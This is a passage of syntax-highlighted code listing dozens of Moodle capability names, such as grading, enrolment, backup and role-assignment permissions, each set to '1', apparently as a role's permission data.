class="string">&#x27;block/recent_activity:viewaddupdatemodule&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/recent_activity:viewdeletemodule&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contenttype/h5p:access&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contenttype/h5p:upload&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contenttype/h5p:useeditor&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/category:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/cohort:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/cohort:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/database:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/database:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/flatfile:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/flatfile:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/guest:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/imsenterprise:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/ldap:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/lti:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/lti:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/manual:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/manual:enrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/manual:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/manual:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/manual:unenrolself&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/meta:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/meta:selectaslinked&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/meta:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/mnet:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/paypal:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/paypal:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/paypal:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/paypal:unenrolself&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/self:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/self:holdkey&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/self:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/self:unenrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/self:unenrolself&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/ods:publish&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/ods:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/txt:publish&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/txt:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/xls:publish&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/xls:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/xml:publish&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeexport/xml:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeimport/csv:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeimport/direct:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeimport/xml:publish&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradeimport/xml:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/grader:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/history:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/outcomes:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/overview:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/singleview:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;gradereport/user:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assignment:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/book:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/folder:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/h5pactivity:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/imscp:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/label:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:addcoursetool&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:addmanualinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:addpreconfiguredinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:requesttooladd&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/page:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/resource:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/survey:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/url:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/analytics:listinsights&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:anonymise&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:backupcourse&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:backupsection&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:backuptargetimport&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:configure&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:downloadfile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:userinfo&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:awardbadge&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:configurecriteria&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:configuredetails&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:configuremessages&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:createbadge&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:deletebadge&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:earnbadge&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:revokebadge&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:viewawarded&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:viewbadges&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/calendar:manageentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/calendar:managegroupentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/calendar:manageownentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/cohort:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/comment:delete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/comment:post&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/comment:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:competencygrade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:coursecompetencygradable&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:coursecompetencymanage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:coursecompetencyview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:access&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:deleteanycontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:deleteowncontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:manageanycontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:manageowncontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:upload&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/contentbank:useeditor&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:bulkmessaging&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changecategory&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changefullname&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changeidnumber&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changelockedcustomfields&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changeshortname&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:changesummary&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:creategroupconversations&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:delete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:enrolconfig&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:enrolreview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:ignorefilesizelimits&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:isincompletionreports&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:managefiles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:managegroups&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:managescales&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:markcomplete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:movesections&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:overridecompletion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:renameroles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:reset&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:reviewotherusers&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:sectionvisibility&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:setcurrentsection&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:setforcedlanguage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:tag&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:update&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:useremail&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewhiddencourses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewhiddensections&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewhiddenuserfields&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewparticipants&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewscales&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewsuspendedusers&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:visibility&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/filter:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:export&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:hide&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:import&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:lock&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:managegradingforms&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:manageletters&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:manageoutcomes&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:unlock&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:viewall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:viewhidden&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/notes:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/notes:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:add&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:editall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:editmine&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:flag&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:managecategory&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:moveall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:movemine&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:tagall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:tagmine&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:useall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:usemine&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:viewall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:viewmine&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/rating:rate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/rating:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/rating:viewall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/rating:viewany&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:configure&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:restoreactivity&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:restorecourse&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:restoresection&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:restoretargetimport&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:rolldates&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:uploadfile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:userinfo&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:viewautomatedfilearea&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:assign&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:override&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:review&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:safeoverride&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:switchroles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:viewreports&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:loginas&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:viewdetails&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:viewhiddendetails&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/completion:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/log:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/log:viewtoday&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/loglive:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/outline:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/outline:viewuserreport&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/participation:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/progress:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/stats:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/contentbank:accesscoursecontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/monitor:managerules&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/monitor:subscribe&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/recyclebin:deleteitems&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/recyclebin:restoreitems&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/recyclebin:viewitems&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;webservice/rest:use&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;webservice/soap:use&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;webservice/xmlrpc:use&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;atto/h5p:addembed&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;atto/recordrtc:recordaudio&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;atto/recordrtc:recordvideo&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;booktool/exportimscp:export&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;booktool/importhtml:import&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;booktool/print:print&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;forumreport/summary:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;forumreport/summary:viewall&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:editothersubmission&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:exportownsubmission&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:grade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:grantextension&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:manageallocations&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:managegrades&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:manageoverrides&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:receivegradernotifications&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:releasegrades&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:revealidentities&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:reviewgrades&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:showhiddengrader&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:submit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:viewblinddetails&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assign:viewgrades&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assignment:exportownsubmission&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assignment:grade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assignment:submit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/assignment:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/book:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/book:read&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/book:viewhiddenchapters&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:chat&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:deletelog&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:exportparticipatedsession&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:exportsession&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:readlog&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/chat:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:choose&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:deleteresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:downloadresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:readresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/choice:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:approve&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:comment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:exportallentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:exportentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:exportownentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:exportuserinfo&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:managecomments&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:manageentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:managetemplates&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:manageuserpresets&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:rate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:viewallratings&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:viewalluserpresets&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:viewanyrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:viewentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:viewrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/data:writeentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:complete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:createprivatetemplate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:createpublictemplate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:deletesubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span 